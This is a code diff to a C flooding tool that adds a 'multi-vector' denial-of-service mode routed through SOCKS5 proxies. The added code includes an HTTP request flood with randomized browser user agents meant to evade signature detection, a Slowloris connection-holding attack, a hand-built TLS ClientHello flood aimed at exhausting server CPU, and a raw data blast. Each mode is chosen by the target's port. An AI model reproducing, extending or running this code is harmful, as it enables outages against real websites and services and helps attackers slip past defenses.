@@ -152,27 +152,58 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
             if (dr == 0) goto cleanup;
             if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
             if (args.is_vn_tcp) {
-                // VN: drain recv + send data immediately (don't waste an epoll cycle)
+                // VN: drain recv + immediately send next attack payload
                 struct epoll_event ev2;
                 ev2.events = EPOLLIN | EPOLLOUT | EPOLLET;
                 ev2.data.ptr = conn;
                 epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->fd, &ev2);
                 conn->writable = 1;
-                // Immediate send burst after drain
+                // Immediate send after drain — multi-vector payload
                 int ret;
-                while (1) {
-                    int s = 16384 + (fast_rand() % 16384);
-                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
-                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
-                    if (ret <= 0) {
-                        if (errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0;
-                        break;
+                int vn_mode = conn->sub_stage; // 0=http, 1=slowloris, 2=tls, 3=raw
+                if (vn_mode == 0 || vn_mode == 1) {
+                    // HTTP flood: send realistic requests
+                    static const char *vn_methods[] = {"GET", "POST", "HEAD", "PUT", "OPTIONS"};
+                    static const char *vn_paths[] = {"/", "/index.html", "/api/v1/data", "/search?q=", "/wp-login.php", "/admin", "/.well-known/", "/favicon.ico", "/robots.txt", "/sitemap.xml"};
+                    char http_req[2048];
+                    int batch = 0;
+                    while (batch < 32) {
+                        int meth_idx = fast_rand() % 5;
+                        int path_idx = fast_rand() % 10;
+                        int req_len = snprintf(http_req, sizeof(http_req),
+                            "%s %s%u HTTP/1.1\r\n"
+                            "Host: %s\r\n"
+                            "User-Agent: %s\r\n"
+                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                            "Accept-Language: en-US,en;q=0.5\r\n"
+                            "Accept-Encoding: gzip, deflate\r\n"
+                            "Connection: keep-alive\r\n"
+                            "Cache-Control: no-cache\r\n"
+                            "\r\n",
+                            vn_methods[meth_idx], vn_paths[path_idx], fast_rand() % 99999,
+                            args.host[0] ? args.host : args.target_ip,
+                            conn->randomized_ua[0] ? conn->randomized_ua : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                        ret = send(conn->fd, http_req, req_len, MSG_NOSIGNAL);
+                        if (ret <= 0) { if (errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].tcp_packets++;
+                        thread_stats[thread_id].bytes += ret;
+                        batch++;
                     }
-                    thread_stats[thread_id].packets++;
-                    thread_stats[thread_id].tcp_packets++;
-                    thread_stats[thread_id].bytes += ret;
+                    if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
+                } else {
+                    // Raw/TLS mode: large sends
+                    while (1) {
+                        int s = 16384 + (fast_rand() % 16384);
+                        int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
+                        ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
+                        if (ret <= 0) { if (errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].tcp_packets++;
+                        thread_stats[thread_id].bytes += ret;
+                    }
+                    if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
                 }
-                if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
             }
             return;
         }
@@ -850,16 +881,149 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
             }
             
             else if (args.is_vn_tcp) {
-                // VN Raw Hex Blast — large sends to minimize syscall overhead through SOCKS5
+                // VN Multi-Vector Attack through SOCKS5 proxy
+                // sub_stage: 0=HTTP flood, 1=Slowloris, 2=TLS flood, 3=Raw blast
                 int ret = 0;
-                while(1) {
-                    int s = 16384 + (fast_rand() % 16384);  // 16-32KB per send
-                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
-                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
-                    if(ret <= 0) { if(errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
-                    thread_stats[thread_id].packets++;
-                    thread_stats[thread_id].tcp_packets++;
-                    thread_stats[thread_id].bytes += ret;
+                
+                // First entry: assign attack mode based on port + randomness
+                if (conn->sub_stage == 0 && conn->payload_idx == 0) {
+                    conn->payload_idx = 1; // mark as initialized
+                    if (args.port == 443) {
+                        // TLS port: mix of TLS flood (60%) and HTTP (40%)
+                        conn->sub_stage = (fast_rand() % 100 < 60) ? 2 : 0;
+                    } else if (args.port == 80 || args.port == 8080 || args.port == 8443) {
+                        // HTTP port: mix of HTTP flood (50%), Slowloris (30%), Raw (20%)
+                        int r = fast_rand() % 100;
+                        if (r < 50) conn->sub_stage = 0;
+                        else if (r < 80) conn->sub_stage = 1;
+                        else conn->sub_stage = 3;
+                    } else {
+                        // Other ports: raw blast (70%) + connection hold (30%)
+                        conn->sub_stage = (fast_rand() % 100 < 70) ? 3 : 1;
+                    }
+                }
+                
+                if (conn->sub_stage == 0) {
+                    // === HTTP FLOOD — valid-looking requests bypass signature detection ===
+                    static const char *vn_methods[] = {"GET", "POST", "HEAD", "PUT", "OPTIONS"};
+                    static const char *vn_paths[] = {"/", "/index.html", "/api/v1/data", "/search?q=", "/wp-login.php", "/admin", "/.well-known/", "/favicon.ico", "/robots.txt", "/sitemap.xml"};
+                    char http_req[2048];
+                    int batch = 0;
+                    while (batch < 64) {
+                        int meth_idx = fast_rand() % 5;
+                        int path_idx = fast_rand() % 10;
+                        int req_len = snprintf(http_req, sizeof(http_req),
+                            "%s %s%u HTTP/1.1\r\n"
+                            "Host: %s\r\n"
+                            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1%02d.0.0.0 Safari/537.36\r\n"
+                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                            "Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
+                            "Accept-Encoding: gzip, deflate, br\r\n"
+                            "Connection: keep-alive\r\n"
+                            "Upgrade-Insecure-Requests: 1\r\n"
+                            "Sec-Fetch-Dest: document\r\n"
+                            "Sec-Fetch-Mode: navigate\r\n"
+                            "Sec-Fetch-Site: none\r\n"
+                            "Sec-Fetch-User: ?1\r\n"
+                            "Cache-Control: max-age=0\r\n"
+                            "\r\n",
+                            vn_methods[meth_idx], vn_paths[path_idx], fast_rand() % 99999,
+                            args.host[0] ? args.host : args.target_ip,
+                            fast_rand() % 30 + 100);
+                        ret = send(conn->fd, http_req, req_len, MSG_NOSIGNAL);
+                        if (ret <= 0) { if (errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].tcp_packets++;
+                        thread_stats[thread_id].bytes += ret;
+                        batch++;
+                    }
+                }
+                else if (conn->sub_stage == 1) {
+                    // === SLOWLORIS — hold connections open, exhaust state table ===
+                    // Send partial HTTP header every pulse interval
+                    if (now - conn->last_pulse_ms >= 3000 + (fast_rand() % 5000)) {
+                        static const char *slow_headers[] = {
+                            "X-a: %u\r\n", "X-b: %u\r\n", "X-c: %u\r\n",
+                            "X-d: %u\r\n", "X-e: %u\r\n", "X-f: %u\r\n"
+                        };
+                        char slow_buf[128];
+                        // If first time, send initial partial GET
+                        if (conn->h2_stream_id == 0) {
+                            int slen = snprintf(slow_buf, sizeof(slow_buf),
+                                "GET /%u HTTP/1.1\r\nHost: %s\r\n",
+                                fast_rand() % 99999,
+                                args.host[0] ? args.host : args.target_ip);
+                            ret = send(conn->fd, slow_buf, slen, MSG_NOSIGNAL);
+                            conn->h2_stream_id = 1;
+                        } else {
+                            // Send one more partial header to keep alive
+                            int hdr_idx = fast_rand() % 6;
+                            int slen = snprintf(slow_buf, sizeof(slow_buf), slow_headers[hdr_idx], fast_rand());
+                            ret = send(conn->fd, slow_buf, slen, MSG_NOSIGNAL);
+                        }
+                        if (ret > 0) {
+                            thread_stats[thread_id].packets++;
+                            thread_stats[thread_id].bytes += ret;
+                        }
+                        conn->last_pulse_ms = now;
+                    }
+                    return; // Don't cleanup on Slowloris — hold connection
+                }
+                else if (conn->sub_stage == 2) {
+                    // === TLS FLOOD — repeated ClientHello exhausts CPU (15x cost) ===
+                    static __thread unsigned char tls_ch[256];
+                    static __thread int tls_ch_len = 0;
+                    if (tls_ch_len == 0) {
+                        int p = 0;
+                        tls_ch[p++] = 0x16; // Handshake
+                        tls_ch[p++] = 0x03; tls_ch[p++] = 0x01; // TLS 1.0
+                        int rec_pos = p; p += 2; // record length
+                        tls_ch[p++] = 0x01; // ClientHello
+                        int hs_pos = p; p += 3; // handshake length
+                        tls_ch[p++] = 0x03; tls_ch[p++] = 0x03; // TLS 1.2
+                        for (int i = 0; i < 32; i++) tls_ch[p++] = fast_rand() & 0xFF; // random
+                        tls_ch[p++] = 32; // session ID len
+                        for (int i = 0; i < 32; i++) tls_ch[p++] = fast_rand() & 0xFF;
+                        // cipher suites
+                        unsigned short ciphers[] = {0x1301,0x1302,0x1303,0xc02c,0xc02b,0xc030,0xc02f,0xcca9,0xcca8,0x00ff};
+                        int nc = 10;
+                        tls_ch[p++] = 0; tls_ch[p++] = nc * 2;
+                        for (int i = 0; i < nc; i++) { tls_ch[p++] = ciphers[i] >> 8; tls_ch[p++] = ciphers[i] & 0xFF; }
+                        tls_ch[p++] = 1; tls_ch[p++] = 0; // compression
+                        // lengths
+                        int hs_len = p - hs_pos - 3;
+                        tls_ch[hs_pos] = (hs_len >> 16) & 0xFF;
+                        tls_ch[hs_pos+1] = (hs_len >> 8) & 0xFF;
+                        tls_ch[hs_pos+2] = hs_len & 0xFF;
+                        int rec_len = p - rec_pos - 2;
+                        tls_ch[rec_pos] = (rec_len >> 8) & 0xFF;
+                        tls_ch[rec_pos+1] = rec_len & 0xFF;
+                        tls_ch_len = p;
+                    }
+                    // Randomize client random per send
+                    int batch = 0;
+                    while (batch < 128) {
+                        *((unsigned int*)(tls_ch + 11)) = fast_rand();
+                        *((unsigned int*)(tls_ch + 15)) = fast_rand();
+                        ret = send(conn->fd, tls_ch, tls_ch_len, MSG_NOSIGNAL);
+                        if (ret <= 0) { if (errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].tcp_packets++;
+                        thread_stats[thread_id].bytes += ret;
+                        batch++;
+                    }
+                }
+                else {
+                    // === RAW BLAST — fallback for non-HTTP/TLS ports ===
+                    while(1) {
+                        int s = 16384 + (fast_rand() % 16384);
+                        int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
+                        ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
+                        if(ret <= 0) { if(errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].tcp_packets++;
+                        thread_stats[thread_id].bytes += ret;
+                    }
                 }
                 if(ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
             }
@@ -1115,6 +1279,20 @@ int spawn_connection(int epoll_fd, int thread_id) {
     conn->client_udp_fd = -1;
     if (!args.is_v15_raw_amp && !args.is_hybrid_v15 && !args.is_vn_tcp) {
         generate_random_headers(conn->randomized_headers, conn->randomized_ua, args.host);
+    }
+    // VN: generate UA only (needed for HTTP flood mode)
+    if (args.is_vn_tcp) {
+        static const char *vn_uas[] = {
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%d.0 Mobile/15E148 Safari/604.1"
+        };
+        int ua_idx = fast_rand() % 5;
+        int ver = 100 + (fast_rand() % 30);
+        snprintf(conn->randomized_ua, sizeof(conn->randomized_ua), vn_uas[ua_idx], ver, ver);
+        conn->payload_idx = 0; // reset init flag
     }
 
     if (args.is_v14_phantom && !p) {
